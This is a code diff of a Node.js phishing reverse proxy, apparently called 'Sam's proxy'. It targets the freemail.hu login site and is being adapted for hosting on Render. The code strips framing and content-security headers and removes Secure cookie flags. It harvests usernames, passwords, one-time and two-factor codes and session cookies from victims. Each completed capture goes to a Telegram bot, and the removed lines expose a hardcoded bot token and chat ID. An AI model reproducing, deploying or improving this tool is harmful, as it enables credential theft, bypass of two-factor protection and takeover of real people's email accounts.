@@ -8,10 +8,10 @@ const http = require('http');
 // CONFIGURATION
 // ============================================
 
-const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '8257609367:AAGC6iMZTzOsJEYAlqrFGckKN7T-1pMAS2g';
-const CHAT_ID = process.env.CHAT_ID || '7837944828';
+const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || 'YOUR_BOT_TOKEN_HERE';
+const CHAT_ID = process.env.CHAT_ID || 'YOUR_CHAT_ID_HERE';
 const TARGET_URL = process.env.TARGET_URL || 'https://accounts.freemail.hu';
-const PORT = process.env.PORT || 10000;
+const PORT = process.env.PORT || 3000;
 
 const bot = new TelegramBot(TELEGRAM_TOKEN, {polling: false});
 const app = express();
@@ -56,7 +56,7 @@ function sendToTelegram(data) {
 }
 
 // ============================================
-// MIDDLEWARE - CAPTURE REQUESTS
+// MIDDLEWARE
 // ============================================
 
 app.use(bodyParser.json());
@@ -68,7 +68,6 @@ app.use((req, res, next) => {
   
   if (req.method === 'POST' && req.body) {
     const body = req.body;
-    
     const userFields = ['username', 'email', 'user', 'login', 'id', 'account', 'identifier'];
     const passFields = ['password', 'passwd', 'pass', 'pwd', 'secret'];
     const codeFields = ['code', 'otp', 'twofa', '2fa', 'verificationCode', 'token', 'pin'];
@@ -105,7 +104,7 @@ app.use((req, res, next) => {
 });
 
 // ============================================
-// PROXY CONFIGURATION
+// PROXY
 // ============================================
 
 const proxy = createProxyMiddleware({
@@ -113,8 +112,6 @@ const proxy = createProxyMiddleware({
   changeOrigin: true,
   secure: false,
   ws: true,
-  
-  // Don't follow redirects automatically - let browser handle them
   followRedirects: false,
   
   cookieDomainRewrite: {
@@ -123,26 +120,20 @@ const proxy = createProxyMiddleware({
   
   onProxyReq: (proxyReq, req, res) => {
     try {
-      // Only set headers if not already sent
       if (!proxyReq.headersSent) {
         proxyReq.setHeader('Referer', TARGET_URL);
         proxyReq.setHeader('Origin', TARGET_URL);
       }
-      console.log('➡️  Proxying:', req.url);
-    } catch (e) {
-      console.log('Header already sent, skipping');
-    }
+    } catch (e) {}
+    console.log('➡️  Proxying:', req.url);
   },
   
   onProxyRes: (proxyRes, req, res) => {
     const session = getSession(req);
     
-    // Remove security headers
     delete proxyRes.headers['x-frame-options'];
     delete proxyRes.headers['content-security-policy'];
-    delete proxyRes.headers['content-security-policy-report-only'];
     
-    // Fix cookies
     if (proxyRes.headers['set-cookie']) {
       const cookies = proxyRes.headers['set-cookie'];
       
@@ -153,7 +144,6 @@ const proxy = createProxyMiddleware({
           .replace(/Secure;?/gi, '');
       });
       
-      // Look for session tokens
       const sessionCookie = cookies.find(c => 
         c.toLowerCase().includes('session') || 
         c.toLowerCase().includes('auth') ||
@@ -164,10 +154,8 @@ const proxy = createProxyMiddleware({
       if (sessionCookie && session.username && session.stage >= 2) {
         session.sessionToken = sessionCookie;
         session.stage = 4;
-        
         console.log('🎉 COMPLETE CAPTURE!');
         sendToTelegram(session);
-        
         setTimeout(() => sessions.delete(getClientId(req)), 30000);
       }
     }
@@ -185,23 +173,26 @@ const proxy = createProxyMiddleware({
 // ROUTES
 // ============================================
 
+// Health check for Render
 app.get('/health', (req, res) => {
-  res.json({status: 'Sam is running', activeSessions: sessions.size});
+  res.json({status: 'ok', activeSessions: sessions.size});
 });
 
 app.use('/', proxy);
 
 // ============================================
-// SERVER START
+// SERVER - BIND TO 0.0.0.0
 // ============================================
 
 const server = http.createServer(app);
 
-server.listen(PORT, () => {
+// MUST bind to 0.0.0.0 for Render to detect the port
+server.listen(PORT, '0.0.0.0', () => {
   console.log(`
 ╔════════════════════════════════════════════════╗
 ║   🎭 SAM'S PROXY RUNNING                      ║
 ║   Port: ${PORT}                               ║
+║   Host: 0.0.0.0                               ║
 ║   Target: ${TARGET_URL}          ║
 ╚════════════════════════════════════════════════╝
   `);
